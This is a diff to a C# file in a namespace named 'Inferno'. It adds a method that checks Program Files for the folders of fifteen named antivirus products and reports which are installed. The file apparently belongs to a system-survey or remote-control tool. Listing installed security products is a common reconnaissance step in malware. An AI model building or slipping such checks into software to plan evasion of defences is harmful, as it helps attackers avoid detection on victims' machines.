@@ -1,4 +1,6 @@
 ﻿using System;
+using System.Collections.Generic;
+using System.IO;
 using System.Management;
 using System.Runtime.InteropServices;
 using System.Threading;
@@ -7,7 +9,7 @@ using System.Windows.Forms;
 namespace Inferno
 {
 	internal class status
-    {
+	{
 
 		// Output
 		private static dynamic output = new System.Dynamic.ExpandoObject();
@@ -117,5 +119,41 @@ namespace Inferno
 			output.battery = result;
 			core.Exit("Battery information received!", output);
 		}
+
+		// Get installed antivirus
+		public static void antivirus()
+		{
+			List<string> detected = new List<string>();
+			string[] av_path = new string[]
+			{
+				"AVAST Software\\Avast",
+				"AVG\\Antivirus",
+				"Avira\\Launcher",
+				"IObit\\Advanced SystemCare",
+				"Bitdefender Antivirus Free",
+				"COMODO\\COMODO Internet Security",
+				"DrWeb",
+				"ESET\\ESET Security",
+				"GRIZZLY Antivirus",
+				"Kaspersky Lab",
+				"IObit\\IObit Malware Fighter",
+				"Norton Security",
+				"Panda Security\\Panda Security Protection",
+				"360\\Total Security",
+				"Windows Defender"
+			};
+
+			foreach(string av in av_path)
+			{
+				string av_dir = Environment.GetEnvironmentVariable("ProgramFiles") + "\\" + av;
+				if (Directory.Exists(av_dir))
+				{
+					detected.Add(Path.GetFileName(Path.GetDirectoryName(av_dir + "\\0")));
+				}
+			}
+			output.detected = detected;
+			core.Exit("Detected " + detected.Count + " antiviruses", output);
+		}
+
 	}
 }
